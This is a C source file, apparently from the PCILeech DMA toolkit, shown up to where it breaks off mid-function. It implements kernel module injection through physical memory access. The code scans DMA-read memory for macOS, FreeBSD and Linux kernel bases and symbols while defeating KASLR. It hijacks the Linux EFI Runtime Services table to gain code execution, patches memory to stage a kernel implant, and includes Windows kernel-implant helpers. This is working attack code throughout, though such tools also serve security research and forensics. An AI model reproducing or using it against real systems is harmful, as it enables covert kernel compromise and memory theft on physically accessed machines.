// kmd.c : implementation related to operating systems kernel modules functionality.
//
// (c) Ulf Frisk, 2016-2020
// Author: Ulf Frisk, pcileech@frizk.net
//
#include "kmd.h"
#include "device.h"
#include "util.h"
#include "executor.h"
#include "vmmx.h"

typedef struct tdKMDHANDLE_S12 {
    QWORD qwPageAddr;
    DWORD dwPageOffset;
    BYTE pbOrig[4096];
    BYTE pbPatch[4096];
    BYTE pbLatest[4096];
    QWORD qwPTE;
    QWORD qwPTEOrig;
    QWORD qwPTEAddrPhys;
} KMDHANDLE_S12, *PKMDHANDLE_S12;

typedef struct tdKERNELSEEKER {
    PBYTE pbSeek;
    DWORD cbSeek;
    DWORD aSeek;
    DWORD aTableEntry;
    DWORD aFn;
    QWORD vaSeek;
    QWORD vaFn;
} KERNELSEEKER, *PKERNELSEEKER;

#define STAGE1_OFFSET_CALL_ADD          1
#define STAGE2_OFFSET_STAGE3_PHYSADDR   4
#define STAGE2_OFFSET_FN_STAGE1_ORIG    8
#define STAGE2_OFFSET_EXTRADATA1        16

_Success_(return) BOOL KMD_GetPhysicalMemoryMap();
_Success_(return) BOOL KMD_SetupStage3(_In_ DWORD dwPhysicalAddress, _In_ PBYTE pbStage3, _In_ DWORD cbStage3);

//-------------------------------------------------------------------------------
// Signature mathing below.
//-------------------------------------------------------------------------------

_Success_(return)
BOOL KMD_FindSignature2(_Inout_ PBYTE pbPages, _In_ DWORD cPages, _In_ QWORD qwAddrBase, _Inout_ PSIGNATURE pSignatures, _In_ DWORD cSignatures, _Out_ PDWORD pdwSignatureMatch)
{
    PBYTE pb;
    PSIGNATURE ps;
    QWORD pgIdx, i, j, qwAddressCurrent;
    for(pgIdx = 0; pgIdx < cPages; pgIdx++) {
        pb = pbPages + (4096 * pgIdx);
        qwAddressCurrent = qwAddrBase + (4096 * pgIdx);
        for(i = 0; i < cSignatures; i++) {
            ps = pSignatures + i;
            for(j = 0; j < 2; j++) {
                if(ps->chunk[j].qwAddress) { // already processed and found - continue
                    continue;
                }
                if((ps->chunk[j].cbOffset > 0xfff) && ((ps->chunk[j].cbOffset & ~0xfff) != qwAddressCurrent)) {
                    continue;
                }
                if(!ps->chunk[j].cb || !memcmp(pb + (ps->chunk[j].cbOffset & 0xfff), ps->chunk[j].pb, ps->chunk[j].cb)) {
                    ps->chunk[j].cb = 4096;
                    memcpy(ps->chunk[j].pb, pb, 4096);
                    ps->chunk[j].qwAddress = qwAddressCurrent;
                }
            }
            if(ps->chunk[0].qwAddress && ps->chunk[1].qwAddress) {
                *pdwSignatureMatch = (DWORD)i;
                return TRUE;
            }
        }
    }
    return FALSE;
}

_Success_(return)
BOOL KMD_FindSignature1(_Inout_ PSIGNATURE pSignatures, _In_ DWORD cSignatures, _Out_ PDWORD pdwSignatureMatchIdx)
{
    BOOL result = FALSE;
    QWORD i, qwAddrMax, qwAddrCurrent = max(0x100000, ctxMain->cfg.qwAddrMin);
    PBYTE pbBuffer8M = NULL;
    PPAGE_STATISTICS pPageStat = NULL;
    // special case (fixed memory location && zero signature byte length)
    for(i = 0; i < cSignatures; i++) {
        if((pSignatures[i].chunk[0].cbOffset > 0xfff) && (pSignatures[i].chunk[0].cb == 0) && (pSignatures[i].chunk[1].cbOffset > 0xfff) && (pSignatures[i].chunk[1].cb == 0)) {
            pSignatures[i].chunk[0].qwAddress = pSignatures[i].chunk[0].cbOffset & ~0xFFF;
            pSignatures[i].chunk[1].qwAddress = pSignatures[i].chunk[1].cbOffset & ~0xFFF;
            return TRUE;
        }
    }
    // initialize / allocate memory / load signatures
    if(!(pbBuffer8M = LocalAlloc(0, 0x800000))) { goto cleanup; }
    // loop kmd-find
    qwAddrMax = min(ctxMain->cfg.qwAddrMax, ctxMain->dev.paMax);
    if(!PageStatInitialize(&pPageStat, qwAddrCurrent, qwAddrMax, "Searching for KMD location", FALSE, FALSE)) { goto cleanup; }
    while(qwAddrCurrent < qwAddrMax) {
        pPageStat->qwAddr = qwAddrCurrent;
        if(DeviceReadDMA(qwAddrCurrent, 0x800000, pbBuffer8M, pPageStat)) {
            result = KMD_FindSignature2(pbBuffer8M, 2048, qwAddrCurrent, pSignatures, cSignatures, pdwSignatureMatchIdx);
            if(result) {
                pPageStat->szAction = "Waiting for KMD to activate";
                goto cleanup;
            }
        }
        qwAddrCurrent += 0x800000;
    }
cleanup:
    PageStatClose(&pPageStat);
    LocalFree(pbBuffer8M);
    return result;
}

// EFI RUNTIME SERVICES TABLE SIGNATURE (see UEFI specification (2.6) for detailed information).
#define IS_SIGNATURE_EFI_RUNTIME_SERVICES(pb) ((*(PQWORD)(pb) == 0x56524553544e5552) && (*(PDWORD)(pb + 12) == 0x88) && (*(PDWORD)(pb + 20) == 0))

_Success_(return)
BOOL KMD_FindSignature_EfiRuntimeServices(_Out_ PQWORD pqwAddrPhys)
{
    BOOL result = FALSE;
    QWORD o, qwCurrentAddress;
    PPAGE_STATISTICS pPageStat = NULL;
    PBYTE pbBuffer16M = NULL;
    if(!(pbBuffer16M = LocalAlloc(0, 0x01000000))) { goto cleanup; }
    // Option 1: User-supplied efibase option (= base of EFI RUNTIME SERVICES table (RUNTSERV)).
    if(ctxMain->cfg.qwEFI_IBI_SYST) { // technically not EFI_IBI_SYST table but we use this user-supplied option anyway here.
        result =
            ((ctxMain->cfg.qwEFI_IBI_SYST & 0xfff) > 0x18) &&
            ((ctxMain->cfg.qwEFI_IBI_SYST & 0xfff) < (0x1000 - 0x88)) &&
            DeviceReadMEM(ctxMain->cfg.qwEFI_IBI_SYST & ~0xfff, 0x1000, pbBuffer16M, TRUE) &&
            IS_SIGNATURE_EFI_RUNTIME_SERVICES(pbBuffer16M + (ctxMain->cfg.qwEFI_IBI_SYST & 0xfff));
        LocalFree(pbBuffer16M);
        *pqwAddrPhys = ctxMain->cfg.qwEFI_IBI_SYST;
        return result;
    }
    // Option 2: Scan for EFI RUNTIME SERVICES table (RUNTSERV).
    ctxMain->cfg.qwAddrMin &= ~0xfff;
    ctxMain->cfg.qwAddrMax = (ctxMain->cfg.qwAddrMax + 1) & ~0xfff;
    if(ctxMain->cfg.qwAddrMax == 0) {
        ctxMain->cfg.qwAddrMax = 0x100000000;
    }
    qwCurrentAddress = ctxMain->cfg.qwAddrMin;
    if(!PageStatInitialize(&pPageStat, ctxMain->cfg.qwAddrMin, ctxMain->cfg.qwAddrMax, "Searching for EFI Runtime Services", ctxMain->phKMD ? TRUE : FALSE, ctxMain->cfg.fVerbose)) { goto cleanup; }
    while(qwCurrentAddress < ctxMain->cfg.qwAddrMax) {
        result = Util_Read16M(pbBuffer16M, qwCurrentAddress, pPageStat);
        if(!result && !ctxMain->cfg.fForceRW && !ctxMain->phKMD) {
            goto cleanup;
        }
        for(o = 0x18; o < 0x01000000 - 0x88; o += 8) {
            // EFI RUNTIME SERVICES TABLE SIGNATURE (see UEFI specification (2.6) for detailed information).
            // 0x30646870 == phd0 EFI memory artifact required to rule out additional false positives.
            if((*(PDWORD)(pbBuffer16M + o - 0x18) == 0x30646870) && IS_SIGNATURE_EFI_RUNTIME_SERVICES(pbBuffer16M + o)) {
                pPageStat->szAction = "Waiting for EFI Runtime Services";
                *pqwAddrPhys = qwCurrentAddress + o;
                result = TRUE;
                goto cleanup;
            }
        }
        // add to address
        qwCurrentAddress += 0x01000000;
    }
cleanup:
    PageStatClose(&pPageStat);
    LocalFree(pbBuffer16M);
    return result;
}

//-------------------------------------------------------------------------------
// macOS generic kernel seek below.
//-------------------------------------------------------------------------------

BOOL KMD_MacOSIsKernelAddress(_In_ PBYTE pbPage)
{
    DWORD i;
    if(*(PDWORD)pbPage != 0xfeedfacf) { return FALSE; } // mach_header_64 magic
    if(*(PDWORD)(pbPage + 4) != 0x01000007) { return FALSE; } // mach_header_64 cputype
    // search for kernel header data (eliminate other macho-headers)
    for(i = 0x20; i < 0xfc0; i += 8) {
        if(*(PQWORD)(pbPage + i) == 0x5450746f6F625F5F) { // __bootPT
            return TRUE;
        }
    }
    return FALSE;
}

_Success_(return)
BOOL KMD_MacOSKernelGetBase(_Out_ PDWORD pdwKernelBase, _Out_ PDWORD pdwTextHIB, _Out_ PDWORD pcbTextHIB)
{
    BYTE pbPage[4096];
    DWORD i, cKSlide;
    for(cKSlide = 1; cKSlide <= 512; cKSlide++) {
        *pdwKernelBase = cKSlide * 0x00200000; // KASLR = ([RND:1..512] * 0x00200000)
        if(!DeviceReadDMA_Retry(ctxMain->hLC, *pdwKernelBase, 4096, pbPage)) {
            printf("KMD: Failed. Error reading address: 0x%08x\n", *pdwKernelBase);
            return FALSE;
        }
        if(KMD_MacOSIsKernelAddress(pbPage)) {
            for(i = 0x20; i < 0xfc0; i += 8) {
                if(*(PQWORD)(pbPage + i) == 0x0000747865745F5F && *(PQWORD)(pbPage + i + 0x10) == 0x0000004249485F5F) { // __text && __HIB
                    *pdwTextHIB = (DWORD)*(PQWORD)(pbPage + i + 0x20);
                    *pcbTextHIB = (DWORD)*(PQWORD)(pbPage + i + 0x28);
                    return TRUE;
                }
            }
        }
    }
    return FALSE;
}

_Success_(return)
BOOL KMD_MacOSKernelSeekSignature(_Out_ PSIGNATURE pSignature)
{
    const BYTE SIGNATURE_BCOPY[] = { 0x48, 0x87, 0xF7, 0x48, 0x89, 0xD1, 0x48, 0x89, 0xF8, 0x48, 0x29, 0xF0, 0x48, 0x39, 0xC8, 0x72 };
    DWORD i, dwKernelBase, dwTextHIB, cbTextHIB;
    PBYTE pbTextHIB;
    if(!KMD_MacOSKernelGetBase(&dwKernelBase, &dwTextHIB, &cbTextHIB)) {
        return FALSE;
    }
    cbTextHIB = (cbTextHIB + 0xfff) & 0xfffff000;
    pbTextHIB = LocalAlloc(0, cbTextHIB);
    if(!pbTextHIB) { return FALSE; }
    if(!DeviceReadDMA(dwTextHIB, cbTextHIB, pbTextHIB, NULL)) {
        LocalFree(pbTextHIB);
        return FALSE;
    }
    for(i = 0; i < cbTextHIB - 0x300; i++) {
        if(0 == memcmp(pbTextHIB + i, SIGNATURE_BCOPY, 16)) {
            Util_CreateSignatureMacOSGeneric(dwKernelBase, dwTextHIB + i, dwTextHIB + cbTextHIB - 0x300, pSignature);
            LocalFree(pbTextHIB);
            return TRUE;
        }
    }
    LocalFree(pbTextHIB);
    return FALSE;
}

//-------------------------------------------------------------------------------
// FreeBSD generic kernel seek below.
//-------------------------------------------------------------------------------

_Success_(return)
BOOL KMD_FreeBSDKernelSeekSignature(_Out_ PSIGNATURE pSignature)
{
    DWORD i, dwo_memcpy_str, dwo_strtab, dwa_memcpy;
    PBYTE pb64M = LocalAlloc(LMEM_ZEROINIT, 0x04000000);
    if(!pb64M) { return FALSE; }
    for(i = 0x01000000; i < 0x04000000; i += 0x01000000) {
        DeviceReadDMA(i, 0x01000000, pb64M + i, NULL);
    }
    // 1: search for string 'vn_open'
    i = 0;
    while(TRUE) {
        i++;
        if(i > 0x04000000 - 0x1000) { goto error; }
        if(0 == memcmp(pb64M + i, "\0vn_open", 9)) { break; }
    }
    dwo_memcpy_str = i + 1;
    i = i & ~3;
    // 2: scan backwards for base of strtab
    while(TRUE) {
        i -= 4;
        if(i < 0x1000) { goto error; }
        if(0 == *(PDWORD)(pb64M + i - 4)) {
            break;
        }
    }
    dwo_strtab = i;
    i = i - 8; // skip necessary
    // 3: scan backwards for 'vn_open' function address
    while(TRUE) {
        i -= 0x18;
        if(i < 0x1000) { goto error; }
        if(0 == *(PQWORD)(pb64M + i)) { goto error; }
        if(dwo_memcpy_str - dwo_strtab == *(PDWORD)(pb64M + i)) { break; }
    }
    dwa_memcpy = *(PDWORD)(pb64M + i + 8) & 0x7fffffff;
    // 4: create signature
    LocalFree(pb64M);
    Util_CreateSignatureFreeBSDGeneric(dwo_strtab, dwa_memcpy, pSignature);
    return TRUE;
error:
    LocalFree(pb64M);
    return FALSE;
}

//-------------------------------------------------------------------------------
// LINUX generic kernel seek below. Comes in two versions:
// 4.6- version that works with 32 and 64-bit addressing
// 4.8+ version that works with 64-bit addressing, 32-bit will work too if kernel is KASLRed <4GB.
//-------------------------------------------------------------------------------

_Success_(return)
BOOL KMD_LinuxIsAllAddrFoundSeek(_In_ PKERNELSEEKER pS, _In_ DWORD cS)
{
    DWORD j;
    for(j = 0; j < cS; j++) {
        if(!pS[j].aSeek) {
            return FALSE;
        }
    }
    return TRUE;
}

_Success_(return)
BOOL KMD_LinuxIsAllAddrFoundTableEntry(_In_ PKERNELSEEKER pS, _In_ DWORD cS)
{
    DWORD j;
    for(j = 0; j < cS; j++) {
        if(!pS[j].aTableEntry) {
            return FALSE;
        }
    }
    return TRUE;
}

_Success_(return)
BOOL KMD_LinuxFindFunctionAddr(_In_ PBYTE pb, _In_ DWORD cb, _In_ PKERNELSEEKER pS, _In_ DWORD cS)
{
    DWORD o, i;
    for(o = 0; o < cb - 0x1000; o++) {
        for(i = 0; i < cS; i++) {
            if(!pS[i].aSeek && !memcmp(pb + o, pS[i].pbSeek, pS[i].cbSeek)) {
                pS[i].aSeek = o + 1;
                if(KMD_LinuxIsAllAddrFoundSeek(pS, cS)) {
                    return TRUE;
                }
            }
        }
    }
    return FALSE;
}

/*
* Locate function addresses in symtab with absolute addressing.
*/
_Success_(return)
BOOL KMD_LinuxFindFunctionAddrTBL_Absolute(_In_ PBYTE pb, _In_ DWORD cb, _In_ PKERNELSEEKER pS, _In_ DWORD cS)
{
    DWORD o, i;
    for(o = 0x1000; o < cb - 0x1000; o = o + 8) {
        if(((*(PQWORD)(pb + o) & 0xffffffff00000000) == 0xffffffff00000000) && ((*(PQWORD)(pb + o - 8) & 0xffffffff00000000) == 0xffffffff00000000)) { // kernel addr ptr
            for(i = 0; i < cS; i++) {
                if(!pS[i].aTableEntry) {
                    if((*(PQWORD)(pb + o) & 0x1fffff) == (0x1fffff & pS[i].aSeek)) { // KASLR align on 2MB boundaries (0x1fffff)
                        if((*(PQWORD)(pb + o) & ~0x1fffff) != (*(PQWORD)(pb + o - 8)  & ~0x1fffff)) { // several tables may exists - skip symbol name table)
                            pS[i].aTableEntry = o;
                            pS[i].vaSeek = *(PQWORD)(pb + o);
                            pS[i].vaFn = *(PQWORD)(pb + o - 8);
                            if(KMD_LinuxIsAllAddrFoundTableEntry(pS, cS)) {
                                return TRUE;
                            }
                        }
                    }
                }
            }
        }
    }
    return FALSE;
}

_Success_(return)
BOOL KMD_LinuxFindFunctionAddrTBL_RelativeSymTabSearch(_In_ PBYTE pb, _In_ DWORD cb, _In_ DWORD cbStart, _In_ PKERNELSEEKER pS)
{
    DWORD o, oFn;
    for(o = cbStart; o < cb - 8; o += 4) {
        if(o + *(PDWORD)(pb + o + 4) + 4 == pS->aSeek) {
            oFn = o + *(PDWORD)(pb + o);
            if((oFn < 0x02000000) && !(oFn & 0xf) && (oFn != o)) {
                pS->aTableEntry = o;
                pS->aFn = oFn;
                return TRUE;
            }
        }
    }
    return FALSE;
}

/*
* Locate function addresses in symtab with relative addressing.
*/
_Success_(return)
BOOL KMD_LinuxFindFunctionAddrTBL_Relative(_In_ PBYTE pb, _In_ DWORD cb, _In_ PKERNELSEEKER pS, _In_ DWORD cS)
{
    QWORD va, vaBase = (QWORD)-1;
    DWORD i, o;
    // 1: Locate virtual address base of kernel by just scanning for lowest value
    //    of qualifying pointer - dirty but it seems to be working ...
    for(i = 0, o = pS->aSeek & ~0xf; o < cb - 8; o += 8) {
        va = *(PQWORD)(pb + o);
        if(((va & 0xffffffff80000fff) == (0xffffffff80000000)) && (va != 0xffffffff80000000)) {
            vaBase = min(vaBase, va & 0xffffffffffe00000);
            if(++i == 0x100) { break; }
        }
    }
    if(vaBase == (QWORD)-1) {
        return FALSE;
    }
    // 2: Locate relative addresses of functions from symtab and fix virtual addresses
    for(i = 0; i < cS; i++) {
        if(!KMD_LinuxFindFunctionAddrTBL_RelativeSymTabSearch(pb, cb, ((pS[0].aSeek & ~0xf) - 0x00100000), pS + i)) {
            return FALSE;
        }
        pS[i].vaSeek = vaBase + pS[i].aSeek;
        pS[i].vaFn = vaBase + pS[i].aFn;
    }
    return TRUE;
}

_Success_(return)
BOOL KMD_LinuxFindFunctionAddrTBL(_In_ PBYTE pb, _In_ DWORD cb, _In_ PKERNELSEEKER pS, _In_ DWORD cS)
{
    return KMD_LinuxFindFunctionAddrTBL_Absolute(pb, cb, pS, cS) || KMD_LinuxFindFunctionAddrTBL_Relative(pb, cb, pS, cS);
}

#define CONFIG_LINUX_SEEK_BUFFER_SIZE       0x01000000
#define CONFIG_LINUX_SEEK_CKSLIDES          512
_Success_(return)
BOOL KMD_Linux46KernelSeekSignature(_Out_ PSIGNATURE pSignature)
{
    BOOL result;
    KERNELSEEKER ks[2] = {
        { .pbSeek = (PBYTE)"\0kallsyms_lookup_name",.cbSeek = 22 },
        { .pbSeek = (PBYTE)"\0vfs_read",.cbSeek = 10 }
    };
    DWORD cKSlide, dwKernelBase;
    PBYTE pb = LocalAlloc(0, CONFIG_LINUX_SEEK_BUFFER_SIZE);
    if(!pb) { return FALSE; }
    for(cKSlide = 0; cKSlide < CONFIG_LINUX_SEEK_CKSLIDES; cKSlide++) {
        // calculate the kernel base (@16M if no KASLR, @2M offsets if KASLR).
        // read 16M of memory first, if KASLR read 2M chunks at top of analysis buffer (performance reasons).
        dwKernelBase = 0x01000000 + cKSlide * 0x00200000; // KASLR = 16M + ([RND:0..511] * 2M) ???
        if(cKSlide == 0) {
            DeviceReadDMA(dwKernelBase, 0x01000000, pb, NULL);
        } else {
            memmove(pb, pb + 0x00200000, CONFIG_LINUX_SEEK_BUFFER_SIZE - 0x00200000);
            result = DeviceReadDMA_Retry(
                ctxMain->hLC,
                (QWORD)dwKernelBase + CONFIG_LINUX_SEEK_BUFFER_SIZE - 0x00200000,
                0x00200000,
                pb + CONFIG_LINUX_SEEK_BUFFER_SIZE - 0x00200000);
        }
        result =
            KMD_LinuxFindFunctionAddr(pb, CONFIG_LINUX_SEEK_BUFFER_SIZE, ks, 2) &&
            KMD_LinuxFindFunctionAddrTBL(pb, CONFIG_LINUX_SEEK_BUFFER_SIZE, ks, 2);
        if(result) {
            Util_CreateSignatureLinuxGeneric(dwKernelBase, ks[0].aSeek, ks[0].vaSeek, ks[0].vaFn, ks[1].aSeek, ks[1].vaSeek, ks[1].vaFn, pSignature);
            break;
        }
    }
    LocalFree(pb);
    return result;
}

QWORD KMD_Linux48KernelBaseSeek()
{
    PPAGE_STATISTICS pPageStat = NULL;
    BYTE pb[0x1000], pbCMPcc[0x400], pbCMP90[0x400], pbCMP00[0x100];
    QWORD qwA, qwAddrMax, i;
    BOOL isAuthenticAMD, isGenuineIntel;
    memset(pbCMPcc, 0xcc, 0x400);
    memset(pbCMP90, 0x90, 0x400);
    memset(pbCMP00, 0x00, 0x100);
    qwA = max(0x01000000, ctxMain->cfg.qwAddrMin) & 0xffffffffffe00000;
    qwAddrMax = max(0x01000000, (ctxMain->dev.paMax - 0x01000000) & 0xffffffffffe00000);
    if(!PageStatInitialize(&pPageStat, qwA, qwAddrMax, "Scanning for Linux kernel base", FALSE, FALSE)) { return 0; }
    // Linux kernel uses 2MB pages. Base of kernel is assumed to have AuthenticAMD and GenuineIntel strings
    // in first page. First page should also end with at least 0x400 0x90's. 2nd page (hypercall page?) is
    // assumed to end with 0x100 0x00's.
    for(; qwA <= qwAddrMax; qwA += 0x00200000) {
        pPageStat->qwAddr = qwA;
        if(!LcRead(ctxMain->hLC, qwA, 0x400, pb)) {
            PageStatUpdate(pPageStat, qwA, 0, 512);
            continue;
        }
        PageStatUpdate(pPageStat, qwA, 512, 0);
        // Search for GenuineIntel and AuthenticAMD strings.
        isGenuineIntel = isAuthenticAMD = FALSE;
        for(i = 0; i < 0x400; i++) {
            isAuthenticAMD |= ((0x68747541 == *(PDWORD)(pb + i)) && (0x69746e65 == *(PDWORD)(pb + i + 8)) && (0x444d4163 == *(PDWORD)(pb + i + 16)));
            isGenuineIntel |= ((0x756e6547 == *(PDWORD)(pb + i)) && (0x49656e69 == *(PDWORD)(pb + i + 8)) && (0x6c65746e == *(PDWORD)(pb + i + 16)));
        }
        if(!isGenuineIntel || !isAuthenticAMD) {
            continue;
        }
        // Verify that page ends with 0x400 NOPs (0x90) or 0x400 0xCC.
        if(!LcRead(ctxMain->hLC, qwA, 0x1000, pb) || (memcmp(pb + 0xc00, pbCMP90, 0x400) && memcmp(pb + 0xc00, pbCMPcc, 0x400))) {
            continue;
        }
        // read kernel base + 0x1000 (hypercall page?) and check that it ends with at least 0x100 0x00.
        if(!LcRead(ctxMain->hLC, qwA + 0x1000, 0x1000, pb) || memcmp(pb + 0xf00, pbCMP00, 0x100)) {
            continue;
        }
        PageStatClose(&pPageStat);
        return qwA;
    }
    PageStatClose(&pPageStat);
    return 0;
}

#define KMD_LINUX48SEEK_MAX_BYTES       0x02000000      // 32MB
_Success_(return)
BOOL KMD_Linux48KernelSeekSignature(_Out_ PSIGNATURE pSignature)
{
    BOOL result = FALSE;
    PBYTE pb = NULL;
    QWORD paKernelBase;
    PPAGE_STATISTICS pPageStat = NULL;
    KERNELSEEKER ks[2] = {
        { .pbSeek = (PBYTE)"\0kallsyms_lookup_name",.cbSeek = 22 },
        { .pbSeek = (PBYTE)"\0vfs_read",.cbSeek = 10 }
    };
    if(!(pb = LocalAlloc(0, KMD_LINUX48SEEK_MAX_BYTES))) { goto fail; }
    paKernelBase = KMD_Linux48KernelBaseSeek();
    if(!paKernelBase) { goto fail; }
    printf("\n");
    if(!PageStatInitialize(&pPageStat, paKernelBase, paKernelBase + KMD_LINUX48SEEK_MAX_BYTES, "Verifying Linux kernel base", FALSE, FALSE)) { goto fail; }
    PageStatUpdate(pPageStat, paKernelBase, 0, 0);
    DeviceReadDMA(paKernelBase, KMD_LINUX48SEEK_MAX_BYTES, pb, pPageStat);
    result = KMD_LinuxFindFunctionAddr(pb, KMD_LINUX48SEEK_MAX_BYTES, ks, 2) && KMD_LinuxFindFunctionAddrTBL(pb, KMD_LINUX48SEEK_MAX_BYTES, ks, 2);
    if(result) {
        Util_CreateSignatureLinuxGeneric(paKernelBase, ks[0].aSeek, ks[0].vaSeek, ks[0].vaFn, ks[1].aSeek, ks[1].vaSeek, ks[1].vaFn, pSignature);
    }
    // fall-through
fail:
    PageStatClose(&pPageStat);
    LocalFree(pb);
    return result;
}

//-------------------------------------------------------------------------------
// LINUX EFI Runtime Services hijack.
//-------------------------------------------------------------------------------

_Success_(return)
BOOL KMDOpen_LinuxEfiRuntimeServicesHijack()
{
    BOOL result;
    QWORD i, o, qwAddrEfiRt;
    DWORD dwPhysAddrS2, dwPhysAddrS3, *pdwPhysicalAddress;
    BYTE pb[0x1000], pbOrig[0x1000], pbEfiRt[0x1000];
    PSIGNATURE pSignature = NULL;
    pSignature = LocalAlloc(LMEM_ZEROINIT, sizeof(SIGNATURE));
    if(!pSignature) { goto fail; }
    //------------------------------------------------
    // 1: Locate and fetch EFI Runtime Services table.
    //------------------------------------------------
    result = KMD_FindSignature_EfiRuntimeServices(&qwAddrEfiRt);
    if(!result) {
        printf("KMD: Failed. EFI Runtime Services not found.\n");
    }
    if((qwAddrEfiRt & 0xfff) + 0x88 > 0x1000) {
        printf("KMD: Failed. EFI Runtime Services table located on page boundary.\n");
        goto fail;
    }
    result = DeviceReadDMA_Retry(ctxMain->hLC, qwAddrEfiRt & ~0xfff, 0x1000, pbEfiRt);
    if(!result || !IS_SIGNATURE_EFI_RUNTIME_SERVICES(pbEfiRt + (qwAddrEfiRt & 0xfff))) {
        printf("KMD: Failed. Error reading EFI Runtime Services table.\n");
        goto fail;
    }
    //------------------------------------------------
    // 2: Fetch signature and original data.
    //------------------------------------------------
    Util_CreateSignatureLinuxEfiRuntimeServices(pSignature);
    *(PQWORD)(pSignature->chunk[3].pb + 0x28) = qwAddrEfiRt; // 0x28 == offset data_addr_runtserv.
    memcpy(pSignature->chunk[3].pb + 0x30, pbEfiRt + (qwAddrEfiRt & 0xfff) + 0x18, 0x70); // 0x30 == offset data_runtserv_table_fn.
    result = DeviceReadDMA_Retry(ctxMain->hLC, 0, 0x1000, pbOrig);
    if(!result) {
        printf("KMD: Failed. Error reading at address 0x0.\n");
        goto fail;
    }
    //------------------------------------------------
    // 3: Patch wait to reveive execution of EFI code.
    //------------------------------------------------
    DeviceWriteDMA_Retry(ctxMain->hLC, 0, 0x1000, pSignature->chunk[3].pb);
    for(i = 0; i < 14; i++) {
        o = (qwAddrEfiRt & 0xfff) + 0x18 + 8 * i; // 14 tbl entries of 64-bit/8-byte size.
        *(PQWORD)(pbEfiRt + o) = 0x100 + 2 * i; // each PUSH in receiving slide is 2 bytes, offset to code = 0x100.
    }
    DeviceWriteDMA_Retry(ctxMain->hLC, qwAddrEfiRt, 0x88 /* 0x18 hdr, 0x70 fntbl */, pbEfiRt + (qwAddrEfiRt & 0xfff));
    memset(pb, 0, 0x1000);
    pdwPhysicalAddress = (PDWORD)(pb + 0x20); // 0x20 == offset data_phys_addr_alloc.
    printf(
        "KMD: EFI Runtime Services table hijacked - Waiting to receive execution.\n"
        "     To trigger EFI execution take action. Example: 'switch user' in the\n"
        "     Ubuntu graphical lock screen may trigger EFI Runtime Services call.\n");
    do {
        Sleep(100);
        if(!DeviceReadDMA_Retry(ctxMain->hLC, 0, 0x1000, pb)) {
            Util_WaitForPowerCycle();
            printf("KMD: Resume waiting to receive execution.\n");
        }
    } while(!*pdwPhysicalAddress);
    dwPhysAddrS2 = *pdwPhysicalAddress;
    printf("KMD: Execution received - waiting for kernel hook to activate ...\n");
    //------------------------------------------------
    // 4: Restore EFI Runtime Services shellcode and move on to 2nd buffer.
    //------------------------------------------------
    LcWrite(ctxMain->hLC, 0, 0x1000, pbOrig);
    memset(pb, 0, 0x1000);
    printf("KMD: Waiting to receive execution.\n");
    do {
        Sleep(100);
        if(!DeviceReadDMA_Retry(ctxMain->hLC, dwPhysAddrS2, 0x1000, pb)) {
            printf("KMD: Failed. DMA Read failed while waiting to receive physical address.\n");
            goto fail;
        }
    } while(!*pdwPhysicalAddress);
    dwPhysAddrS3 = *pdwPhysicalAddress;
    //------------------------------------------------
    // 5: Clear 2nd buffer and set up stage #3.
    //------------------------------------------------
    memset(pb, 0, 0x1000);
    LcWrite(ctxMain->hLC, dwPhysAddrS2, 0x1000, pb);
    result = KMD_SetupStage3(dwPhysAddrS3, pSignature->chunk[4].pb, 4096);
    LocalFree(pSignature);
    return result;
fail:
    LocalFree(pSignature);
    return FALSE;
}

//-------------------------------------------------------------------------------
// Windows 8/10 generic kernel implant below.
//-------------------------------------------------------------------------------

_Success_(return)
BOOL KMD_Win_SearchTableHalpApicRequestInterrupt(_In_ PBYTE pbPage, _In_ QWORD qwPageVA, _Out_ PDWORD dwHookFnPgOffset)
{
    DWORD i;
    BOOL result;
    for(i = 0; i < (0x1000 - 0x78); i += 8) {
        result =
            ((*(PQWORD)(pbPage + i + 0x00) & 0xfffff00000000000) == 0xfffff00000000000) &&
            ((*(PQWORD)(pbPage + i + 0x10) & ~0xfff) == qwPageVA) &&
            ((*(PQWORD)(pbPage + i + 0x18) == 0x28) || (*(PQWORD)(pbPage + i + 0x18) == 0x30)) &&
            ((*(PQWORD)(pbPage + i + 0x78) & 0xffffff0000000000) == 0xfffff80000000000);
        if(result) {
            *dwHookFnPgOffset = i + 0x78;
            return TRUE;
        }
    }
    return FALSE;
}

_Success_(return)
BOOL KMDOpen_UEFI_FindEfiBase()
{
    PBYTE pb = NULL;
    PPAGE_STATISTICS pPageStat = NULL;
    DWORD dwAddrCurrent, dwAddrMax;
    QWORD o, qwAddr_BOOTSERV, qwAddr_RUNTSERV;
    printf("KMD: Searching for EFI BASE (no -efibase parameter supplied).\n");
    // initialize & allocate memory
    if(!(pb = LocalAlloc(0, 0x00100000))) { goto fail; }
    dwAddrCurrent = SIZE_PAGE_ALIGN_4K(ctxMain->cfg.qwAddrMin);
    dwAddrMax = max(0xffffffff, SIZE_PAGE_ALIGN_4K(ctxMain->cfg.qwAddrMax) - 1);
    if(!PageStatInitialize(&pPageStat, dwAddrCurrent, dwAddrMax, "Searching for EFI BASE", FALSE, FALSE)) { goto fail; }
    // loop EFI BASE (IBI SYST) find
    while(dwAddrCurrent <= dwAddrMax - 0x100000) {
        if(DeviceReadDMA(dwAddrCurrent, 0x100000, pb, pPageStat)) {
            for(o = 0; o < 0x100000 - 0x100; o += 8) {
                if(0x5453595320494249 != *(PQWORD)(pb + o)) { continue; } // IBI SYST
                qwAddr_BOOTSERV = *(PQWORD)(pb + o + 0x60);
                qwAddr_RUNTSERV = *(PQWORD)(pb + o + 0x58);
                if((qwAddr_BOOTSERV & 0xffffffff00000007) || (qwAddr_RUNTSERV & 0xffffffff00000007)) { continue; }
                if(!(qwAddr_BOOTSERV & 0xfffffff8) || !(qwAddr_RUNTSERV & 0xfffffff8)) { continue; }
                ctxMain->cfg.qwEFI_IBI_SYST = dwAddrCurrent + o;
                pPageStat->szAction = "Waiting for KMD to activate";
                PageStatClose(&pPageStat);
                LocalFree(pb);
                return TRUE;
            }
        } else {
            PageStatUpdate(pPageStat, dwAddrCurrent + 0x100000ULL, 0, 0x100);
        }
        dwAddrCurrent += 0x100000;
    }
fail:
    PageStatClose(&pPageStat);
    LocalFree(pb);
    return FALSE;
}

_Success_(return)
BOOL KMDOpen_UEFI(_In_ BYTE bOffsetHookBootServices)
{
    BOOL result;
    BYTE pb[0x2000];
    QWORD qwAddrEFI_BOOTSERV, qwAddrEFI_RUNTSERV, qwAddrHookedFunction;
    QWORD qwAddrKMDDATA, qwAddrKMD;
    DWORD cb;
    qwAddrKMDDATA = 0x38000000; // Place KMD at a "random" address- Hopefully this works w/o having it overwritten.
    //------------------------------------------------
    // 1: Fetch IBI_SYST and BOOTSERV tables
